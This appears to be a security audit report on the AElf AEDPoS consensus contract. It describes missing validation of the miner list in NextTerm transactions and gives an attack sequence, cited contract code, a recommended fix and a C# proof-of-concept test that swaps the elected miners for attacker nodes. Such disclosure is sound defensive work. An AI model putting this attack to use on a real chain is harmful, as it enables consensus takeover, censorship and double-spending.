# Audit Report

## Title
Missing Validation of Term Transition State Allows Arbitrary Miner List Manipulation

## Summary
The AEDPoS consensus contract fails to validate the miner list content during term transitions. When processing `NextTerm` transactions, the contract converts `NextTermInput` to `Round` via `ToRound()` without verifying that the submitted miner information matches the legitimate state from election victories or current miners. This allows a malicious block producer to submit arbitrary miner lists that bypass all validation and are directly committed to state, completely compromising consensus integrity.

## Finding Description

The vulnerability exists in the term transition validation logic. The legitimate flow generates miner lists through `GenerateFirstRoundOfNextTerm`, which derives miners from election victories (mainchain) or current miners (sidechain). [1](#0-0) 

However, when `ProcessNextTerm` executes, it performs a blind conversion of the input without validating the miner information content. [2](#0-1) 

The `ToRound()` method is a simple data structure conversion with no validation logic - it just copies the `RealTimeMinersInformation` field directly. [3](#0-2) 

The pre-execution validation only checks that round and term numbers increment correctly and that InValues are null, but does NOT validate the actual miner list content (pubkeys, orders, time slots). [4](#0-3) 

The validation pipeline for NextTerm behavior only adds `RoundTerminateValidationProvider` which lacks miner list validation. [5](#0-4) 

Finally, the unvalidated miner information is extracted and directly committed to state via `SetMinerList`. [6](#0-5) 

**Attack Sequence:**
1. Malicious miner calls `GetConsensusExtraData` with NextTerm behavior to obtain legitimate Round data
2. Modifies `Round.RealTimeMinersInformation` to include colluding nodes and exclude legitimate elected miners
3. Creates `NextTermInput` from the modified Round using `NextTermInput.Create` [7](#0-6) 
4. Submits NextTerm transaction with the malicious input
5. Validation passes because it only checks numeric increments, not content
6. Malicious miner list is committed to state and used for future block production

## Impact Explanation

**Critical Consensus Integrity Violation:**
- The miner schedule determines who can produce blocks - this is the foundation of consensus security
- A compromised miner list means attackers control future block production, enabling censorship, double-spending, and chain halts
- On mainchain deployments, this completely bypasses the election system where token holders vote for block producers
- The legitimate miner selection from `TryToGetVictories` can be entirely ignored [8](#0-7) 

**Concrete Harm:**
- Attacker can exclude all legitimate miners and populate the list with their own nodes
- Can manipulate mining time slots to create unfair advantages or impossible schedules
- Breaks the fundamental trust assumption that consensus follows election results
- All network participants are affected as consensus safety underpins all blockchain operations

This represents a HIGH severity issue as it violates a critical protocol invariant.

## Likelihood Explanation

**Attacker Prerequisites:**
- Must be a current block producer (member of active miner list)
- Must produce the specific block when term transition occurs (happens once per term, typically every few days/weeks)

**Attack Complexity: LOW**
The attack requires only basic data manipulation:
1. Call standard consensus method to get legitimate data structure
2. Modify miner list fields in memory
3. Submit modified input via standard transaction

**Feasibility: HIGH**
- Any compromised or malicious miner can execute this attack
- Opportunity occurs regularly (every term transition)
- No special cryptographic operations or exploits required
- Detection is difficult as the malicious list appears legitimate in state

**Probability Assessment:** MEDIUM-HIGH - The attack is simple to execute and any malicious miner controlling a block production slot during term transition can perform it. The only constraint is timing (must produce the NextTerm block), but this occurs predictably.

## Recommendation

Implement miner list validation in `ProcessNextTerm` or the validation pipeline:

```csharp
private void ProcessNextTerm(NextTermInput input)
{
    var nextRound = input.ToRound();
    
    // ADD VALIDATION: Regenerate expected miner list and compare
    var expectedRound = GenerateFirstRoundOfNextTerm(
        Context.RecoverPublicKey().ToHex(), 
        State.MiningInterval.Value
    );
    
    // Validate miner lists match
    var submittedMiners = nextRound.RealTimeMinersInformation.Keys.OrderBy(k => k).ToList();
    var expectedMiners = expectedRound.RealTimeMinersInformation.Keys.OrderBy(k => k).ToList();
    
    Assert(submittedMiners.Count == expectedMiners.Count, 
        "Miner count mismatch in term transition");
    Assert(submittedMiners.SequenceEqual(expectedMiners), 
        "Miner list does not match expected election results");
    
    // Validate miner orders match expected deterministic ordering
    foreach (var miner in submittedMiners)
    {
        Assert(
            nextRound.RealTimeMinersInformation[miner].Order == 
            expectedRound.RealTimeMinersInformation[miner].Order,
            $"Invalid mining order for {miner}"
        );
    }
    
    // Continue with existing logic...
    RecordMinedMinerListOfCurrentRound();
    // ...
}
```

Alternatively, add a dedicated validation provider for NextTerm that performs this check before execution.

## Proof of Concept

```csharp
[Fact]
public async Task MaliciousMinerCanManipulateNextTermMinerList()
{
    // Setup: Initialize chain with legitimate miners
    var legitimateMiners = new[] { "miner1", "miner2", "miner3" };
    await InitializeConsensusWithMiners(legitimateMiners);
    
    // Attacker is current miner
    var attackerPubkey = legitimateMiners[0];
    
    // Get legitimate consensus data for NextTerm
    var triggerInfo = new AElfConsensusTriggerInformation
    {
        Pubkey = ByteString.CopyFrom(attackerPubkey),
        Behaviour = AElfConsensusBehaviour.NextTerm
    };
    
    var consensusData = await ConsensusStub.GetConsensusExtraData.CallAsync(
        new BytesValue { Value = triggerInfo.ToByteString() }
    );
    
    var headerInfo = AElfConsensusHeaderInformation.Parser.ParseFrom(consensusData.Value);
    var legitimateRound = headerInfo.Round;
    
    // ATTACK: Modify miner list to exclude legitimate miners
    var maliciousRound = legitimateRound.Clone();
    maliciousRound.RealTimeMinersInformation.Clear();
    
    // Add only attacker-controlled nodes
    var attackerNodes = new[] { "attacker1", "attacker2", "attacker3" };
    for (int i = 0; i < attackerNodes.Length; i++)
    {
        maliciousRound.RealTimeMinersInformation.Add(attackerNodes[i], new MinerInRound
        {
            Pubkey = attackerNodes[i],
            Order = i + 1,
            ExpectedMiningTime = Timestamp.FromDateTime(DateTime.UtcNow.AddSeconds((i + 1) * 4))
        });
    }
    
    // Create malicious NextTermInput
    var maliciousInput = NextTermInput.Create(maliciousRound, Hash.Generate().ToByteString());
    
    // Submit NextTerm transaction with malicious input
    var result = await ConsensusStub.NextTerm.SendAsync(maliciousInput);
    
    // VULNERABILITY: Transaction succeeds despite malicious miner list
    result.TransactionResult.Status.ShouldBe(TransactionResultStatus.Mined);
    
    // Verify malicious miner list was committed to state
    var currentMinerList = await ConsensusStub.GetCurrentMinerList.CallAsync(new Empty());
    var committedMiners = currentMinerList.Pubkeys.Select(p => p.ToHex()).ToList();
    
    // PROOF: Malicious miners are now in state, legitimate miners excluded
    committedMiners.ShouldContain("attacker1");
    committedMiners.ShouldContain("attacker2");
    committedMiners.ShouldNotContain(legitimateMiners[1]);
    committedMiners.ShouldNotContain(legitimateMiners[2]);
}
```

## Notes

This vulnerability represents a fundamental flaw in consensus validation logic. The system correctly generates legitimate miner lists through `GenerateFirstRoundOfNextTerm` which consults election results, but fails to enforce that submitted miner lists match this canonical source. The validation only checks structural properties (number increments) rather than semantic correctness (actual miner list content).

The fix requires adding a validation step that regenerates the expected miner list and performs a comparison before accepting the term transition. This ensures the submitted data matches what the protocol rules dictate, preventing arbitrary miner list manipulation.

### Citations

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract_ViewMethods.cs (L223-257)
```csharp
    private Round GenerateFirstRoundOfNextTerm(string senderPubkey, int miningInterval)
    {
        Round newRound;
        TryToGetCurrentRoundInformation(out var currentRound);

        if (TryToGetVictories(out var victories))
        {
            Context.LogDebug(() => "Got victories successfully.");
            newRound = victories.GenerateFirstRoundOfNewTerm(miningInterval, Context.CurrentBlockTime,
                currentRound);
        }
        else
        {
            // Miners of new round are same with current round.
            var miners = new MinerList();
            miners.Pubkeys.AddRange(
                currentRound.RealTimeMinersInformation.Keys.Select(k => ByteStringHelper.FromHexString(k)));
            newRound = miners.GenerateFirstRoundOfNewTerm(currentRound.GetMiningInterval(),
                Context.CurrentBlockTime, currentRound);
        }

        newRound.ConfirmedIrreversibleBlockHeight = currentRound.ConfirmedIrreversibleBlockHeight;
        newRound.ConfirmedIrreversibleBlockRoundNumber = currentRound.ConfirmedIrreversibleBlockRoundNumber;

        newRound.BlockchainAge = GetBlockchainAge();

        if (newRound.RealTimeMinersInformation.ContainsKey(senderPubkey))
            newRound.RealTimeMinersInformation[senderPubkey].ProducedBlocks = 1;
        else
            UpdateCandidateInformation(senderPubkey, 1, 0);

        newRound.ExtraBlockProducerOfPreviousRound = senderPubkey;

        return newRound;
    }
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract_ViewMethods.cs (L266-283)
```csharp
    private bool TryToGetVictories(out MinerList victories)
    {
        if (!State.IsMainChain.Value)
        {
            victories = null;
            return false;
        }

        var victoriesPublicKeys = State.ElectionContract.GetVictories.Call(new Empty());
        Context.LogDebug(() =>
            "Got victories from Election Contract:\n" +
            $"{string.Join("\n", victoriesPublicKeys.Value.Select(s => s.ToHex().Substring(0, 20)))}");
        victories = new MinerList
        {
            Pubkeys = { victoriesPublicKeys.Value }
        };
        return victories.Pubkeys.Any();
    }
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract_ProcessConsensusInformation.cs (L161-163)
```csharp
    private void ProcessNextTerm(NextTermInput input)
    {
        var nextRound = input.ToRound();
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract_ProcessConsensusInformation.cs (L187-190)
```csharp
        // Update miners list.
        var miners = new MinerList();
        miners.Pubkeys.AddRange(nextRound.RealTimeMinersInformation.Keys.Select(k => ByteStringHelper.FromHexString(k)));
        if (!SetMinerList(miners, nextRound.TermNumber)) Assert(false, "Failed to update miner list.");
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/Types/NextTermInput.cs (L7-23)
```csharp
    public static NextTermInput Create(Round round, ByteString randomNumber)
    {
        return new NextTermInput
        {
            RoundNumber = round.RoundNumber,
            RealTimeMinersInformation = { round.RealTimeMinersInformation },
            ExtraBlockProducerOfPreviousRound = round.ExtraBlockProducerOfPreviousRound,
            BlockchainAge = round.BlockchainAge,
            TermNumber = round.TermNumber,
            ConfirmedIrreversibleBlockHeight = round.ConfirmedIrreversibleBlockHeight,
            ConfirmedIrreversibleBlockRoundNumber = round.ConfirmedIrreversibleBlockRoundNumber,
            IsMinerListJustChanged = round.IsMinerListJustChanged,
            RoundIdForValidation = round.RoundIdForValidation,
            MainChainMinersRoundNumber = round.MainChainMinersRoundNumber,
            RandomNumber = randomNumber
        };
    }
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/Types/NextTermInput.cs (L25-40)
```csharp
    public Round ToRound()
    {
        return new Round
        {
            RoundNumber = RoundNumber,
            RealTimeMinersInformation = { RealTimeMinersInformation },
            ExtraBlockProducerOfPreviousRound = ExtraBlockProducerOfPreviousRound,
            BlockchainAge = BlockchainAge,
            TermNumber = TermNumber,
            ConfirmedIrreversibleBlockHeight = ConfirmedIrreversibleBlockHeight,
            ConfirmedIrreversibleBlockRoundNumber = ConfirmedIrreversibleBlockRoundNumber,
            IsMinerListJustChanged = IsMinerListJustChanged,
            RoundIdForValidation = RoundIdForValidation,
            MainChainMinersRoundNumber = MainChainMinersRoundNumber
        };
    }
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/ConsensusHeaderInfoValidationProviders/RoundTerminateValidationProvider.cs (L37-47)
```csharp
    private ValidationResult ValidationForNextTerm(ConsensusValidationContext validationContext)
    {
        var extraData = validationContext.ExtraData;
        var validationResult = ValidationForNextRound(validationContext);
        if (!validationResult.Success) return validationResult;

        // Is next term number correct?
        return validationContext.BaseRound.TermNumber.Add(1) != extraData.Round.TermNumber
            ? new ValidationResult { Message = "Incorrect term number for next round." }
            : new ValidationResult { Success = true };
    }
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract_Validation.cs (L89-91)
```csharp
            case AElfConsensusBehaviour.NextTerm:
                validationProviders.Add(new RoundTerminateValidationProvider());
                break;
```
